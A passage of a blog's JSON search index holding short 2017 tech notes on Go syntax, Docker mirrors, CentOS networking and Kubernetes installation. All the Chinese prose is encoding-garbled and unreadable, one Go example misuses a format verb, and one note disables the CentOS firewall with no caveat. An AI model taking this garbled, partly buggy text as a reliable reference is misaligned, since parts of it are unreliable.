}","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go panic/recover å¤„ç†é”™è¯¯æ¨¡å¼","slug":"history/tech/5a0bb422d102fd2345a05398","date":"2017-11-15T03:27:30.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0bb422d102fd2345a05398/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0bb422d102fd2345a05398/","excerpt":"","text":"panic å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹å¼•å‘ï¼Œä½†æ˜¯åªæœ‰åœ¨ defer è°ƒç”¨çš„å‡½æ•°ä¸­æœ‰æ•ˆ// main.go package main import &quot;fmt&quot; func main() { A() B() C() } func A() { fmt.Println(&quot;func A&quot;) } func B() { //defer éœ€è¦åœ¨panicä¹‹å‰ defer func() { if err := recover(); err != nil { fmt.Println(&quot;Recover in B&quot;) } }() panic(&quot;Panic in B&quot;) } func C() { fmt.Println(&quot;func C&quot;) }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go defer","slug":"history/tech/5a0bb02fd102fd2345a05397","date":"2017-11-15T03:10:39.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0bb02fd102fd2345a05397/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0bb02fd102fd2345a05397/","excerpt":"","text":"è°ƒç”¨ç¤ºä¾‹ä¸€:// main.go package main import &quot;fmt&quot; func main() { fmt.Println(&quot;a&quot;) defer fmt.Println(&quot;b&quot;) defer fmt.Println(&quot;c&quot;) } è°ƒç”¨ç¤ºä¾‹äºŒ:// main.go package main import &quot;fmt&quot; func main() { for i := 0; i &lt; 3; i++ { defer fmt.Println(i) } } è°ƒç”¨ç¤ºä¾‹ä¸‰:// main.go æ‰“å°ä¸‰ä¸ª3 package main import &quot;fmt&quot; func main() { for i := 0; i &lt; 3; i++ { defer func() { fmt.Println(i) }() } } è°ƒç”¨ç¤ºä¾‹å››(ç¤ºä¾‹ä¸‰é—­åŒ…ç‰ˆ):// main.go package main import &quot;fmt&quot; func main() { for i := 0; i &lt; 3; i++ { defer func(a int) { fmt.Println(a) }(i) } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go func é—­åŒ…","slug":"history/tech/5a0baf9bd102fd2345a05396","date":"2017-11-15T03:08:11.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0baf9bd102fd2345a05396/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0baf9bd102fd2345a05396/","excerpt":"","text":"é—­åŒ…:// main.go package main import &quot;fmt&quot; func main() { f := closure(10) fmt.Println(f(1)) fmt.Println(f(2)) } func closure(x int) func(int) int { fmt.Println(&quot;%p\\n&quot;, &amp;x) return func(y int) int { fmt.Println(&quot;%p\\n&quot;, &amp;x) return x + y } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go ä¸å®šé•¿å˜å‚","slug":"history/tech/5a0c0c34d102fd2345a0539a","date":"2017-11-14T21:43:16.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0c0c34d102fd2345a0539a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0c0c34d102fd2345a0539a/","excerpt":"","text":"go ä¸å®šé•¿å˜å‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"docker å®˜æ–¹ debian æºå¤±è´¥è§£å†³æ–¹æ¡ˆ","slug":"history/tech/5a0bf0a1d102fd2345a05399","date":"2017-11-14T19:45:37.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0bf0a1d102fd2345a05399/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0bf0a1d102fd2345a05399/","excerpt":"","text":"æ›´æ–°apt-getæº ä½¿ç”¨163çš„æºRUN mv /etc/apt/sources.list /etc/apt/sources.list.bak &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list &amp;&amp; \\ echo &quot;deb-src http://mirrors.163.com/debian/ jessie-proposed-updates main non-free contrib&quot; &gt;&gt;/etc/apt/sources.list","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go ^ å•ç›®è¿ç®—ç¬¦","slug":"history/tech/5a0aeaa40e68a3670593cc7d","date":"2017-11-14T01:07:48.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0aeaa40e68a3670593cc7d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0aeaa40e68a3670593cc7d/","excerpt":"","text":"æŒ‰ä½å–åä»£ç fmt.Println(^1) -2 å–ä¸€ä¸ªè´Ÿæ•°çš„ç»å¯¹å€¼ï¼Œå°±æ˜¯æŒ‰ä½å–åå†åŠ 1ä¸¾ä¾‹ï¼Œ å°†-2çš„æ¯ä¸€ä½åˆ†åˆ«æ‰“å°å‡ºæ¥:var x int32 = -2 for i := 0; i &lt; 32; i++ { //å…ˆæ‰“å°ä½ä½ï¼Œå³ç§»ä¸€ä½ï¼Œåœ¨æ‰“å°å€’æ•°ç¬¬äºŒä½ï¼Œç›´åˆ°æ‰“å°å®Œæ¯• fmt.Println(x &amp; 1) x = x &gt;&gt; 1 } è¿›åˆ¶è¡¨ç¤ºpackage main import ( &quot;fmt&quot; ) func main() { var x int32 = 0 //æ„é€  -2 çš„ 2 è¿›åˆ¶è¡¨ç¤º for i := 32; i &gt;= 1; i-- { x += 1 &lt;&lt; uint32(i) } fmt.Printf(&quot;äºŒè¿›åˆ¶x: %b\\n&quot;, x) fmt.Printf(&quot;åè¿›åˆ¶x: %d\\n&quot;, x) fmt.Printf(&quot;uint32(x): %b\\n&quot;, uint32(x)) fmt.Printf(&quot;int32(x): %b\\n&quot;, int32(x)) var y int = -2 for i := 0; i &lt; 32; i++ { fmt.Print(y &amp; 1) y = y &gt;&gt; 1 } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go map æ“ä½œ","slug":"history/tech/5a0acc0c0e68a3670593cc7c","date":"2017-11-13T22:57:16.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0acc0c0e68a3670593cc7c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0acc0c0e68a3670593cc7c/","excerpt":"","text":"åˆ›å»ºä¸€ä¸ªç©ºçš„map:var m map[int]string m = map[int]string{} fmt.Println(m) ä½¿ç”¨ make å…³é”®å­—:var m map[int]string m = make(map[int]string) fmt.Println(m) ç®€å†™:var m map[int]string = make(map[int]string) // m := make(map[int]string) fmt.Println(m) å­˜å–:m := make(map[int]string) m[1] = &quot;ok&quot; m[2] = &quot;ok&quot; fmt.Println(m) delete(m, 2) fmt.Println(m) å¤æ‚map:m := make(map[int]map[int]string) m[1] = make(map[int]string) m[1][1] = &quot;ok&quot; fmt.Println(m) åˆ©ç”¨å¤šè¿”å›å€¼å¤„ç†æœªåˆå§‹åŒ–çš„æƒ…å†µ:m := make(map[int]map[int]string) a, ok := m[1][1] if !ok { m[1] = make(map[int]string) } m[1][1] = &quot;GOOD&quot; a, ok = m[1][1] fmt.Println(m, a) æ•°ç»„åµŒå¥— map åˆå§‹åŒ–(é”™è¯¯æ–¹æ³•):sm := make([]map[int]string, 5) for _, v := range sm { //è¿™é‡Œvæ˜¯mapä¸­å€¼çš„ä¸€ä¸ªæ‹·è´ï¼Œä¿®æ”¹vä¸ä¼šå½±å“åŸå€¼ v = make(map[int]string, 1) v[1] = &quot;ok&quot; fmt.Println(v) } fmt.Println(sm) æ•°ç»„åµŒå¥— map åˆå§‹åŒ–:sm := make([]map[int]string, 5) for i := range sm { sm[i] = make(map[int]string, 1) sm[i][1] = &quot;ok&quot; fmt.Println(sm[i]) } fmt.Println(sm) å®Œæˆ map ä¸­ key çš„æ’åº:m := map[int]string{1: &quot;a&quot;, 2: &quot;b&quot;, 3: &quot;c&quot;} s := make([]int, len(m)) i := 0 for k, _ := range m { s[i] = k i++ } sort.Ints(s) fmt.Println(s) è¾“å‡º: [1 2 3] å®Œæˆ map ä¸­ key/value çš„äº¤æ¢:package main import ( &quot;fmt&quot; ) func main() { m1 := map[int]string{1: &quot;a&quot;, 2: &quot;b&quot;, 3: &quot;c&quot;, 4: &quot;d&quot;, 5: &quot;e&quot;} fmt.Println(m1) m2 := make(map[string]int) for k, v := range m1 { m2[v] = k } fmt.Println(m2) }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go array æ“ä½œ","slug":"history/tech/5a0aac8c0e68a3670593cc7b","date":"2017-11-13T20:42:52.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0aac8c0e68a3670593cc7b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0aac8c0e68a3670593cc7b/","excerpt":"","text":"æ•°ç»„åˆå§‹åŒ–a := [...]int{1, 2} var b [2]int b = a fmt.Println(b) æŒ‡é’ˆæ•°ç»„c := [...]int{99: 1} var p *[100]int = &amp;c c[0] = 100 fmt.Println(p) æ•°ç»„çš„æ¯”è¾ƒa := [2]int{1, 2} b := [2]int{1, 2} fmt.Println(a == b) æ•°ç»„ä¹‹é—´ä¸å¯ä»¥åšå¤§äºå°äºçš„æ¯”è¾ƒï¼Œ ä½†æ˜¯å¯ä»¥åš == å’Œ != çš„æ¯”è¾ƒ(å¿…é¡»é•¿åº¦ï¼Œç±»å‹éƒ½ç›¸åŒæ‰è¡Œ)new ä¸€ä¸ªæ•°ç»„:a := [10]int{} a[1] = 2 p := new([10]int) p[1] = 2 fmt.Println(a) fmt.Println(p) å¤šç»´æ•°ç»„:a := [2][3]int{ {1, 1, 2: 2}, {2, 2, 2}} fmt.Println(a) å¤šç»´æ•°ç»„ç¬¬ä¸€ä¸ªæ‹¬å·å†…æ•°å­—å¯ä»¥çœç•¥a := [...][3]int{ {1, 1, 1}, {2, 2, 2}} fmt.Println(a) åˆ‡ç‰‡a := [10]int{1, 2, 3, 4, 5, 6, 7, 8, 9, 0} fmt.Println(a) s := a[:5] fmt.Println(s) ä½¿ç”¨ make åˆå§‹åŒ– slice://make(ç±»å‹ï¼Œå¤§å°ï¼Œ å®¹é‡) s := make([]int, 3, 10) fmt.Println(s, len(s), cap(s)) æ•°ç»„å’Œåˆ‡ç‰‡çš„å®¹é‡:a := [3]int{1, 2, 3} b := a[1:] c := b[1:] fmt.Println(a, len(a), cap(a)) fmt.Println(b, len(b), cap(b)) fmt.Println(c, len(c), cap(c)) append å¯¼è‡´é‡æ–°åˆ†é…ç©ºé—´ï¼Œresliceçš„åˆ‡ç‰‡å’ŒåŸå§‹åˆ‡ç‰‡ä¸åœ¨åŒä¸€åœ°å€ï¼Œä¿®æ”¹s1åˆ‡ç‰‡ä¸ä¼šæ”¹å˜s2åˆ‡ç‰‡a := []int{1, 2, 3, 4, 5} s1 := a[2:5] s2 := a[1:3] fmt.Println(s1, s2) s2 = append(s2, 6, 7, 8, 9, 0) s1[0] = 9 fmt.Println(s1, s2) copy å‡½æ•°ä½¿ç”¨s1 := []int{1, 2, 3, 4, 5, 6} s2 := []int{7, 8, 9} copy(s2, s1) fmt.Println(s2) è¾“å‡º: [1 2 3]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go æŸ¥çœ‹ æ–‡æ¡£","slug":"history/tech/5a0aa92a0e68a3670593cc7a","date":"2017-11-13T20:28:26.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0aa92a0e68a3670593cc7a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0aa92a0e68a3670593cc7a/","excerpt":"","text":"å‘½ä»¤:go doc fmt go doc fmt Println æˆ–è€…å¯åŠ¨å†…ç½®æ–‡æ¡£ç½‘ç«™:godoc -http :8080","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go å¸¦æ ‡ç­¾çš„continue ï¼Œ breakï¼Œ goto","slug":"history/tech/5a0aa89f0e68a3670593cc79","date":"2017-11-13T20:26:07.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0aa89f0e68a3670593cc79/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0aa89f0e68a3670593cc79/","excerpt":"","text":"break è·³å‡ºä¸¤å±‚å¾ªç¯, æ¥ç€æ‰§è¡Œå¾ªç¯åé¢çš„è¯­å¥, å¯ä»¥æ‰“å‡º ok:label1: for { for i := 1; i &lt; 10; i++ { if i &gt; 3 { break label1 } } } fmt.Println(&quot;ok&quot;) goto è·³å‡ºä¸¤å±‚å¾ªç¯, æ¥ç€æ‰§è¡Œlabel1 åé¢çš„è¯­å¥, æˆä¸ºæ­»å¾ªç¯ï¼Œ æ— æ³•æ‰“å‡º ok: label1: for { for i := 1; i &lt; 10; i++ { if i &gt; 3 { goto label1 } } } fmt.Println(&quot;ok&quot;) continue å¯ä»¥è¡¨ç¤ºç»§ç»­æ‰§è¡Œï¼Œä»ä¸ºæ­»å¾ªç¯ï¼Œæ— æ³•æ‰“å‡º ok: label1: for { for i := 1; i &lt; 10; i++ { if i &gt; 3 { continue label1 } } } fmt.Println(&quot;ok&quot;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Centos7 å®‰è£…å®Œæ¯•åæ— æ³•è”ç½‘","slug":"history/tech/5a08fb000e68a3670593cc74","date":"2017-11-13T01:53:04.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a08fb000e68a3670593cc74/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a08fb000e68a3670593cc74/","excerpt":"","text":"è§£å†³æ–¹æ³•:# cd /etc/sysconfig/network-scripts/ # vi ifcfg-ens33 ONBOOT=yes","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"wireshark èµ„æ–™","slug":"history/tech/5a08f7c40e68a3670593cc73","date":"2017-11-13T01:39:16.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a08f7c40e68a3670593cc73/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a08f7c40e68a3670593cc73/","excerpt":"","text":"å›¾ä¹¦","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gcc å®‰è£…","slug":"history/tech/5a095f9a0e68a3670593cc78","date":"2017-11-12T21:02:18.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a095f9a0e68a3670593cc78/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a095f9a0e68a3670593cc78/","excerpt":"","text":"https://gcc.gnu.org/install/binaries.htmltdm-gcchttp://blog.csdn.net/mecho/article/details/24305369","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"google linux æº","slug":"history/tech/5a0939200e68a3670593cc77","date":"2017-11-12T18:18:08.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0939200e68a3670593cc77/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0939200e68a3670593cc77/","excerpt":"","text":"https://packages.cloud.google.com/curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos é˜²ç«å¢™å…³é—­","slug":"history/tech/5a0938ff0e68a3670593cc76","date":"2017-11-12T18:17:35.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0938ff0e68a3670593cc76/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0938ff0e68a3670593cc76/","excerpt":"","text":"centos é˜²ç«å¢™å…³é—­systemctl stop firewalld.service #åœæ­¢firewall systemctl disable firewalld.service #ç¦æ­¢firewallå¼€æœºå¯åŠ¨ firewall-cmd --state","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubernets é•œåƒå¯¼å…¥å¯¼å‡º","slug":"history/tech/5a0938bd0e68a3670593cc75","date":"2017-11-12T18:16:29.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a0938bd0e68a3670593cc75/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a0938bd0e68a3670593cc75/","excerpt":"","text":"A æœºå™¨:ARCH=amd64 docker pull gcr.io/google_containers/hyperkube-${ARCH}:v1.8.3 docker pull gcr.io/google_containers/kube-apiserver-${ARCH}:v1.8.3 docker pull gcr.io/google_containers/kube-controller-manager-${ARCH}:v1.8.3 docker pull gcr.io/google_containers/kube-scheduler-${ARCH}:v1.8.3 docker pull gcr.io/google_containers/kube-proxy-${ARCH}:v1.8.3 docker pull gcr.io/google_containers/k8s-dns-sidecar-${ARCH}:1.14.4 docker pull gcr.io/google_containers/k8s-dns-kube-dns-${ARCH}:1.14.4 docker pull gcr.io/google_containers/k8s-dns-dnsmasq-nanny-${ARCH}:1.14.4 docker pull gcr.io/google_containers/etcd-${ARCH}:3.0.17 docker pull gcr.io/google_containers/kube-discovery-${ARCH}:1.0 docker pull gcr.io/google_containers/etcd-${ARCH}:3.0.4 docker pull gcr.io/google_containers/pause-${ARCH}:3.0 docker save `docker images -aq` &gt; images.tar tar -czvf images.tar.gz ./images.tar rm -rf ./images.tar B æœºå™¨:tar -xzvf images.tar.gz rm -rf images.tar.gz docker load &lt; images.tar ARCH=amd64 docker tag 75f8fab20be8 gcr.io/google_containers/hyperkube-${ARCH}:v1.8.3 docker tag cb809b44649a gcr.io/google_containers/kube-apiserver-${ARCH}:v1.8.3 docker tag daf30b917b69 gcr.io/google_containers/kube-controller-manager-${ARCH}:v1.8.3 docker tag 8c83f779e0f1 gcr.io/google_containers/kube-scheduler-${ARCH}:v1.8.3 docker tag b1c0d274f2fb gcr.io/google_containers/kube-proxy-${ARCH}:v1.8.3 docker tag 38bac66034a6 gcr.io/google_containers/k8s-dns-sidecar-${ARCH}:1.14.4 docker tag a8e00546bcf3 gcr.io/google_containers/k8s-dns-kube-dns-${ARCH}:1.14.4 docker tag f7f45b9cb733 gcr.io/google_containers/k8s-dns-dnsmasq-nanny-${ARCH}:1.14.4 docker tag 243830dae7dd gcr.io/google_containers/etcd-${ARCH}:3.0.17 docker tag c5e0c9a457fc gcr.io/google_containers/kube-discovery-${ARCH}:1.0 docker tag 3fe6c6f972cd gcr.io/google_containers/etcd-${ARCH}:3.0.4 docker tag 99e59f495ffa gcr.io/google_containers/pause-${ARCH}:3.0","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubernetes èµ„æ–™","slug":"history/tech/5a07d08b0e68a3670593cc71","date":"2017-11-12T04:39:39.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a07d08b0e68a3670593cc71/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a07d08b0e68a3670593cc71/","excerpt":"","text":"https://www.gitbook.com/book/rootsongjc/kubernetes-handbook/details","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kubernetes  å®‰è£…","slug":"history/tech/5a07c7890e68a3670593cc70","date":"2017-11-12T04:01:13.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a07c7890e68a3670593cc70/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a07c7890e68a3670593cc70/","excerpt":"","text":"ä¸‹è½½äºŒè¿›åˆ¶åŒ…:æ–‡æ¡£åœ°å€: https://kubernetes.io/docs/getting-started-guides/binary_release/ github äºŒè¿›åˆ¶åŒ…: https://github.com/kubernetes/kubernetes/releases è§£å‹:tar xzvf kubernetes.tar.gz cd kubernetes ./cluster/get-kube-binaries.sh å®‰è£…é•œåƒ:docker pull gcr.io/google_containers/pause-amd64:3.0 docker pull gcr.io/google_containers/hyperkube-amd64:v1.8.3 docker pull gcr.io/google_containers/kube-apiserver-amd64:v1.8.3 docker pull gcr.io/google_containers/kube-controller-manager-amd64:v1.8.3 docker pull gcr.io/google_containers/kube-scheduler-amd64:v1.8.3 docker pull gcr.io/google_containers/kube-discovery-amd64:1.0 docker pull gcr.io/google_containers/etcd-amd64:3.0.4 å¯åŠ¨ kubelet:/usr/local/kubernetes/server/bin/kubelet --pod-infra-container-image=registry.cn-hangzhou.aliyuncs.com/google-containers/pause-amd64:3.0 åˆå§‹åŒ–:# kubeadm init --skip-preflight-checks --pod-network-cidr=&quot;10.24.0.0/16&quot; æŠ¥é”™:[kubeadm] WARNING: kubeadm is in beta, please do not use it for production clusters. unable to get URL &quot;https://dl.k8s.io/release/stable-1.8.txt&quot;: Get https://storage.googleapis.com/kubernetes-release/release/stable-1.8.txt: read tcp 10.0.177.242:37920-&gt;172.217.27.144:443: read: connection reset by peer è§£å†³:kubeadm init --skip-preflight-checks --pod-network-cidr=&quot;10.24.0.0/16&quot; --kubernetes-version=v1.8.3 å‚è€ƒèµ„æ–™:http://oscogozpr.bkt.clouddn.com/èµµæ¢“æ——ï¼å¦‚ä½•ä¼˜é›…çš„éƒ¨ç½²kubernetesé›†ç¾¤.pdf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"gitlab ç”¨docker å¯åŠ¨åï¼Œ æ— æ³•é€šè¿‡ ssh ç™»é™†å®¹å™¨","slug":"history/tech/5a07a00a0e68a3670593cc6f","date":"2017-11-12T01:12:42.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a07a00a0e68a3670593cc6f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a07a00a0e68a3670593cc6f/","excerpt":"","text":"è¿›å…¥å®¹å™¨æŸ¥çœ‹:docker exec -it gitlab /bin/bash ps -ef | grep sshd ä¿®æ”¹ /assets/sshd_config æ–‡ä»¶:","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"privoxy +  ss é…ç½®ä»£ç†","slug":"history/tech/5a07f67b0e68a3670593cc72","date":"2017-11-11T19:21:31.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/5a07f67b0e68a3670593cc72/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a07f67b0e68a3670593cc72/","excerpt":"","text":"ä¸Šå®˜ç½‘ä¸‹è½½:https://www.privoxy.org ç¼–è¯‘å®‰è£…:tar -zxvf privoxy.tar.gz cd privoxy ./configure 